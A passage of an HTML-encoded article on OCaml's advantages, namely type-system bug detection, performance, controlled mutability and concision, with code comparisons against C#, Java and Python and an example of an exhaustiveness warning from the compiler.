&lt;p&gt;&lt;strong&gt;* Bug detection.&lt;/strong&gt; Programmers who are new to OCaml are often taken aback by the degree to which the type system catches bugs. The impression you get is that once you manage to get the typechecker to approve of your code, there are no bugs left. This isn't really true, of course; OCaml's type system is helpless against many bugs. There is, however, a surprisingly wide swath of bugs against which the type system is effective, including many bugs that are quite hard to get at through testing.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;* Performance.&lt;/strong&gt; We found that OCaml's performance was on par with or better than Java's, and within spitting distance of languages such as C or C++. In addition to having a high-quality code generator, OCaml has an incremental GC (garbage collector). This means the GC can be tuned to do small chunks of work at a time, making it more suitable for soft real-time applications such as electronic trading.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;* Pure, mostly&lt;/strong&gt;. Despite how functional programmers often talk about it, mutable state is a fundamental part of programming, and one that cannot and should not be done away with. Sending a network packet or writing to disk are examples of mutability. A complete commitment to immutability is a commitment to never building anything real.&lt;/p&gt;
&lt;p&gt;Mutable state has its costs, however. Mutation-free code is generally easier to reason about, making interactions and dependencies between different parts of your codebase explicit and easier to manage. OCaml strikes a good balance here, making mutation easy, but making immutable data structures the default. A well-written OCaml system almost always has mutable state, but that state is carefully limited.&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Perhaps the easiest of these advantages to demonstrate concretely is that of concision. The importance of concision is clear: other things being equal, shorter code is easier to read, easier to write, and easier to maintain. There are, of course, limits: no good is done by reducing all your function names to single characters, but brevity is nonetheless important, and OCaml does a lot to help keep the codebase small.&lt;/p&gt;
&lt;p&gt;One advantage OCaml brings to the table is type inference, which obviates the need for many type declarations. This leaves you with code that is roughly as compact as code written in dynamic languages such as Python and Ruby. At the same time, you get the performance and correctness benefits of static types.&lt;/p&gt;
&lt;p&gt;Consider the following OCaml function &lt;code&gt;map&lt;/code&gt; for transforming the elements of a tuple.&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;let&lt;/strong&gt;&lt;/span&gt; map f (x,y,z) = &lt;br/&gt;(f x, f y, f z) &lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;Here, &lt;code&gt;map&lt;/code&gt; is defined as a function with two arguments: a function &lt;code&gt;f&lt;/code&gt; and a triple &lt;code&gt;(x,y,z)&lt;/code&gt;. Note that &lt;code&gt;f x&lt;/code&gt; is the syntax for applying the function &lt;code&gt;f&lt;/code&gt; to &lt;code&gt;x&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now consider what this would look like in C# 4.0. The C# code, while functionally equivalent, looks cluttered, with the real structure obscured by syntactic noise.&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;Tuple&amp;lt;U,U,U&amp;gt; Map&amp;lt;T,U&amp;gt;(Func  &amp;lt;T,U&amp;gt; f, Tuple&amp;lt;T,T,T&amp;gt; t) &lt;br/&gt;{ &lt;br/&gt;&lt;span&gt;&lt;strong&gt;return new&lt;/strong&gt;&lt;/span&gt; Tuple&amp;lt;U,U,U&amp;gt;(f(t.item1),  f(t.item2), f(t.item3)); &lt;br/&gt;} &lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;Another source of concision is OCaml's notation for describing types. At the heart of that notation is the notion of an &lt;em&gt;algebraic datatype&lt;/em&gt;. Algebraic datatypes are what you get when you have a system that includes two ways of building up new types: products and sums.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;product type&lt;/em&gt; is the more familiar of the two. Tuples, records, structs, and objects are all examples of product types. A product type combines multiple values of different types into a single value. These are called product types because they correspond mathematically to Cartesian products of the constituent types.&lt;/p&gt;
&lt;p&gt;A &lt;em&gt;sum type&lt;/em&gt; corresponds to a disjoint union of the constituent types, and it is used to express multiple possibilities. Where product types are used when you have multiple things at the same time (a and b and c), sum types are used when you want to enumerate different possibilities (a or b or c). Sum types can be simulated (albeit somewhat clumsily) in object-oriented languages such as Java using subclasses, and they show up as union types in C. But the support in the type systems of most languages for interacting with sum types in a safe way is surprisingly weak.&lt;/p&gt;
&lt;p&gt;Figure 1 provides an example of algebraic datatypes at work. The code defines a type for representing Boolean expressions over a set of base predicates and a function for evaluating those expressions. The code is generic over the set of base predicates, so the subject of these expressions could be anything from integer inequalities to the settings of compiler flags.&lt;/p&gt;
&lt;pre readability=&quot;11&quot;&gt;
 &lt;br/&gt;&lt;span&gt;&lt;strong&gt;type&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; &lt;strong&gt;'&lt;/strong&gt;a expr = | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;True&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;               | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;False&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;               | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;And&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  &lt;/span&gt;&lt;span&gt;&lt;strong&gt;of&lt;/strong&gt; &lt;strong&gt; '&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;a expr * &lt;strong&gt;'&lt;/strong&gt;a  expr&lt;/span&gt; &lt;br/&gt;&lt;span&gt;               | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Or&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;   &lt;/span&gt;&lt;span&gt;&lt;strong&gt;of&lt;/strong&gt; &lt;strong&gt; '&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;a expr * &lt;strong&gt;'&lt;/strong&gt;a  expr&lt;/span&gt; &lt;br/&gt;&lt;span&gt;               | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Not&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  &lt;/span&gt;&lt;span&gt;&lt;strong&gt;of&lt;/strong&gt; &lt;strong&gt; '&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;a expr&lt;/span&gt; &lt;br/&gt;&lt;span&gt;               | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Base&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;of&lt;/strong&gt; &lt;strong&gt; '&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;a &lt;/span&gt; &lt;p&gt;&lt;span&gt;&lt;strong&gt;let&lt;/strong&gt; &lt;strong&gt; rec&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; eval eval_base expr  =&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   &lt;/span&gt;&lt;span&gt;&lt;strong&gt;let&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  eval' x = eval eval_base x &lt;/span&gt;&lt;span&gt;&lt;strong&gt;in&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   &lt;/span&gt;&lt;span&gt;&lt;strong&gt;match&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; expr &lt;/span&gt;&lt;span&gt;&lt;strong&gt;with&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;True&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  -&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;true&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;False&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; -&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;false&lt;/strong&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Base&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; base  -&amp;gt; eval_base base&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;And&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  (x,y) -&amp;gt; eval' x &amp;amp;&amp;amp; eval' y &lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Or&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  (x,y)  -&amp;gt; eval' x || eval' y&lt;/span&gt; &lt;br/&gt;&lt;span&gt;   | &lt;/span&gt;&lt;span&gt;&lt;strong&gt;Not&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;  x     -&amp;gt; not (eval' x)&lt;/span&gt; &lt;/p&gt;&lt;p&gt;&lt;span&gt;Figure 1. Expression  type and evaluator in OCaml&lt;/span&gt; 
&lt;/p&gt;&lt;/pre&gt;
&lt;p&gt;The sum type &lt;code&gt;expr&lt;/code&gt; is indicated by the pipes separating the different arms of the declaration. Some of those arms, such as &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt;, are simple tags, not materially different from the elements of an enumeration in Java or C. Others, such as &lt;code&gt;And&lt;/code&gt; and &lt;code&gt;Not&lt;/code&gt;, have associated data, and that data varies between the cases. This type actually contains both sums and products, with the &lt;code&gt;And&lt;/code&gt; and &lt;code&gt;Or&lt;/code&gt; branches containing tuples. Types consisting of layered combinations of products and sums are a common and powerful idiom in OCaml.&lt;/p&gt;
&lt;p&gt;One notable bit of syntax is the type variable &lt;code&gt;'a&lt;/code&gt;. A type variable can be instantiated with any type, and this is what allows the code to be generic over the set of base predicates. This is similar to how generic types are handled in Java or C#. Thus, Java's &lt;code&gt;&amp;lt;A&amp;gt;List&lt;/code&gt; would be rendered as &lt;code&gt;'a list&lt;/code&gt; in OCaml.&lt;/p&gt;
&lt;p&gt;The function &lt;code&gt;eval&lt;/code&gt; takes two arguments: &lt;code&gt;expr,&lt;/code&gt; the expression to be evaluated; and &lt;code&gt;eval_base&lt;/code&gt;, a function for evaluating base predicates. The code is generic in the sense that &lt;code&gt;eval&lt;/code&gt; could be used for expressions over any type of base predicate, but &lt;code&gt;eval_base&lt;/code&gt; must be provided in order to evaluate the truth or falsehood of those base predicates. The function &lt;code&gt;eval'&lt;/code&gt; is defined as shorthand for invoking recursive calls to &lt;code&gt;eval&lt;/code&gt; with &lt;code&gt;eval_base&lt;/code&gt; as an argument. Finally, the &lt;code&gt;match&lt;/code&gt; statement is used for doing a case analysis of the possible structures of the expression, calling out to eval_base when evaluating a base predicate, and otherwise acting as a straightforward recursion over the structure of the datatypes.&lt;/p&gt;
&lt;p&gt;Figure 2 shows how the same code might be rendered in Java. The verbosity is immediately striking. Adding a single case such as &lt;code&gt;And&lt;/code&gt; takes two (short) lines in OCaml and eight in Java—and the Java code is actually pretty minimal as these things go. If you want to allow the creation of other algorithms around this expression type that are not baked into the class definition, then you probably want to use the visitor pattern, which will inflate the line count considerably.&lt;/p&gt;
&lt;pre readability=&quot;15&quot;&gt;
 &lt;br/&gt;&lt;span&gt;&lt;strong&gt;public  abstract class&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Expr&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;p&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public interface&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Evaluator&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; evaluate(T value); }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public abstract&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator);&lt;/span&gt; &lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; True&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator) { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;return true&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;; }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;False&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator) { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;return false&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;; }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;Base&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; T value;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Base&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(T value) { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;value&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = value; }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator)&lt;/span&gt; &lt;br/&gt;&lt;span&gt;    { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;return&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; evaluator.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;evaluate&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(value); }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;And&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; expr1;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; expr2;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;And&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Expr&amp;lt;T&amp;gt; expr1, Expr&amp;lt;T&amp;gt; expr2)  {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;expr1&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = expr1;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;expr2&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = expr2;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;     }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator) {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;return&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; expr1.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(evaluator) &amp;amp;&amp;amp; expr2.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(evaluator);&lt;/span&gt; &lt;br/&gt;&lt;span&gt;     }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Or&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; expr1;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; expr2;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Or&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Expr&amp;lt;T&amp;gt; expr1, Expr&amp;lt;T&amp;gt; expr2)  {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;expr1&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = expr1;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;expr2&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = expr2;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;     }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator) {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;      &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;return&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; expr1.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(evaluator) || expr2.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(evaluator);&lt;/span&gt; &lt;br/&gt;&lt;span&gt;     }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public class&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Not&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&amp;lt;T&amp;gt; &lt;/span&gt;&lt;span&gt;&lt;strong&gt;extends&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; {&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public final&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; Expr&amp;lt;T&amp;gt; expr;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;Not&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Expr&amp;lt;T&amp;gt; expr) { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;this&lt;/strong&gt;&lt;/span&gt;.&lt;span&gt;&lt;strong&gt;expr&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; = expr; }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;public&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;boolean&lt;/strong&gt;&lt;/span&gt; &lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(Evaluator&amp;lt;T&amp;gt; evaluator)&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;strong&gt;    &lt;/strong&gt; { &lt;/span&gt;&lt;span&gt;&lt;strong&gt;return&lt;/strong&gt;&lt;/span&gt;&lt;span&gt; !expr.&lt;/span&gt;&lt;span&gt;&lt;strong&gt;eval&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;(evaluator); }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;  }&lt;/span&gt; &lt;br/&gt;&lt;span&gt;}&lt;/span&gt; &lt;/p&gt;&lt;p&gt;&lt;span&gt;Figure 2. Expression  type and evaluator in Java&lt;/span&gt; &lt;br/&gt;&lt;/p&gt;&lt;/pre&gt;
&lt;p&gt;Another facet of the language that demands some further explanation is the ability of the type system to catch bugs. People who are not familiar with OCaml and related languages (and some who are) often make the mistake of underestimating the power of the type system. It's easy to conclude that all that the type system does for you is ensure that you passed in your parameters correctly (e.g., that you provided a float where you were supposed to provide a float).&lt;/p&gt;
&lt;p&gt;But there's more to it than that. Even naive use of the type system is eerily good at catching bugs. Consider the following Python code for destuttering a list (i.e., removing sequential duplicates).&lt;br/&gt;&lt;/p&gt;
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;strong readability=&quot;3&quot;&gt; &lt;br/&gt;&lt;span&gt;&lt;em&gt;# Removes sequential duplicates, e.g.,&lt;/em&gt;&lt;/span&gt; &lt;br/&gt;&lt;span&gt;&lt;em&gt;# destutter([1,1,4,3,3,2])  = [1,4,3,2]&lt;/em&gt;&lt;/span&gt; &lt;p&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;destutter(&lt;/span&gt;&lt;span&gt;list&lt;/span&gt;): &lt;br/&gt;l = [] &lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; &lt;span&gt;range&lt;/span&gt;(&lt;span&gt;len&lt;/span&gt;(&lt;span&gt;list&lt;/span&gt;)): &lt;br/&gt;&lt;span&gt;if list&lt;/span&gt;[i] != &lt;span&gt;list&lt;/span&gt;[i+1]: &lt;br/&gt;l.append(&lt;span&gt;list&lt;/span&gt;[i]) &lt;br/&gt;&lt;span&gt;return&lt;/span&gt; l &lt;br/&gt;&lt;/p&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;This code looks pretty straightforward, but it has a bug: it doesn't properly handle the end of the list. Here's one way of fixing it:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;&lt;span&gt;def&lt;/span&gt; &lt;span&gt;destutter&lt;/span&gt;(&lt;span&gt;list&lt;/span&gt;): &lt;br/&gt;l = [] &lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt; &lt;span&gt;range&lt;/span&gt;(&lt;span&gt;len&lt;/span&gt;(&lt;span&gt;list&lt;/span&gt;)): &lt;br/&gt;&lt;span&gt;if&lt;/span&gt; i + 1 &amp;gt;= &lt;span&gt;len&lt;/span&gt;(&lt;span&gt;list&lt;/span&gt;) &lt;span&gt;or &lt;/span&gt;&lt;span&gt;list&lt;/span&gt;[i] != &lt;span&gt;list&lt;/span&gt;[i+1]: &lt;br/&gt;l.append(&lt;/strong&gt;&lt;span&gt;list&lt;/span&gt;[i]) &lt;br/&gt;&lt;span&gt;return&lt;/span&gt; l &lt;br/&gt;&lt;/pre&gt;
&lt;p&gt;Now let's see what happens when writing more or less the same function in OCaml, with more or less the same bug:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;&lt;span&gt;let rec&lt;/span&gt; destutter l = &lt;br/&gt;&lt;span&gt;match&lt;/span&gt; l &lt;span&gt;with&lt;/span&gt; &lt;br/&gt;| &lt;span&gt;[]            &lt;/span&gt; -&amp;gt; &lt;span&gt;[]&lt;/span&gt; &lt;br/&gt;| x :: y :: rest -&amp;gt; &lt;br/&gt;&lt;span&gt;if&lt;/span&gt;  x = y &lt;span&gt;then&lt;/span&gt; destutter (y :: rest) &lt;br/&gt;&lt;span&gt;else&lt;/span&gt;  x :: destutter (y :: rest) &lt;br/&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;This uses OCaml's pattern-matching syntax to get access to the elements of the list. Here &lt;code&gt;::&lt;/code&gt; is the list constructor, and &lt;code&gt;[]&lt;/code&gt; indicates an empty list. Thus, the &lt;code&gt;[]&lt;/code&gt; case matches the empty list, and the &lt;code&gt;x::y::rest&lt;/code&gt; case matches lists that have at least two elements, &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt;. The variable &lt;code&gt;rest&lt;/code&gt; refers to the (potentially empty) remainder of the list.&lt;/p&gt;
&lt;p&gt;Like the Python example, this code fails to contemplate what happens when you get to the end of the list and have only one element left. In this case, however, you find out about the problem not at runtime but at compile time. The compiler gives the following error:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;strong&gt; &lt;br/&gt;File &quot;destutter.ml&quot;, line 2, characters 2-125: &lt;br/&gt;Warning 8: this pattern-matching is not exhaustive. &lt;br/&gt;Here is an example of a value that is not matched: &lt;br/&gt;_::[] &lt;br/&gt;&lt;/strong&gt;
&lt;/pre&gt;
&lt;p&gt;The missing case, &lt;code&gt;_::[]&lt;/code&gt;, is a list with a single element.&lt;/p&gt;
